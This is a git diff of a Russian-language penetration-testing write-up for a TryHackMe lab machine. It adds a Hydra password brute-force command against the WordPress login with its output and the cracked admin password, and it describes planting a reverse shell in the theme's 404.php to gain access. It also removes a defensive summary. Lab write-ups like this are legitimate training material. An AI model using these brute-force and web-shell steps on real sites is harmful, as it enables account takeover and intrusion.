@@ -163,13 +163,42 @@ Interesting Finding(s):
 [+] Elapsed time: 00:00:27
 ```
 
-[+] WordPress version 5.4.2 identified (Insecure, released on 2020-06-10).
+[+] WordPress version 5.4.2 identified (Insecure, released on 2020-06-10).  
 [+] WordPress theme in use: twentyseventeen
-sea
 
+Есть пользователь **admin**, пробую сбрутить пароль
+```
+┌──(kali㉿0x2d-pentest)-[~/Labs/TryHackMe/Lin Hard - Internal/scans]
+└─$ hydra -l admin -P /media/sf_Exchange/Dictionaries/rockyou.txt -t 40 internal.thm -s 80 http-post-form "/blog/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2Finternal.thm%2Fblog%2Fwp-admin%2F&testcookie=1:F=is incorrect" 
+Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-07-09 22:16:29
+[DATA] max 40 tasks per 1 server, overall 40 tasks, 14344398 login tries (l:1/p:14344398), ~358610 tries per task
+[DATA] attacking http-post-form://internal.thm:80/blog/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2Finternal.thm%2Fblog%2Fwp-admin%2F&testcookie=1:F=is incorrect
+[STATUS] 1560.00 tries/min, 1560 tries in 00:01h, 14342838 to do in 153:15h, 40 active
+[80][http-post-form] host: internal.thm   login: admin   password: my2boys                                         
+1 of 1 target successfully completed, 1 valid password found                                                       
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-07-09 22:19:19
+```
+admin@internal.thm
 
 ## 📂 Получение доступа
 
+Захожу в **Appearance -> Theme Editor -> 404.php** и вставляю код reverse shell  
+![theme](screenshots/02.theme.png)
+
+Перехожу в несуществующий пост и получаю доступ    
+![reverse](screenshots/03.reverse.png)
+
+Из пользователей есть **aubreanna**
+```
+$ cd home
+$ ls -la
+total 12
+drwxr-xr-x  3 root      root      4096 Aug  3  2020 .
+drwxr-xr-x 24 root      root      4096 Aug  3  2020 ..
+drwx------  7 aubreanna aubreanna 4096 Aug  3  2020 aubreanna
+```
 
 
 ## ⚙️ Привилегии
@@ -182,21 +211,3 @@ sea
 - Root flag: 
 
 ---
-
-## 📋 Резюме
-
-🧰 **Инструменты:**
-  - nmap, ffuf, и др.
-
-🚨 **Уязвимости, которые удалось обнаружить:**  
-  - Directory Traversal  
-  - RCE через уязвимый скрипт  
-
-🛡 **Советы по защите:**
-  - Использовать сложные пароли и ограничить число попыток входа
-  - Обновлять ПО до актуальных версий
-  - Удалять/ограничивать использование SUID-бинарников
-  - Настроить логирование и мониторинг системных событий
-  - Применять принцип наименьших привилегий
-
-
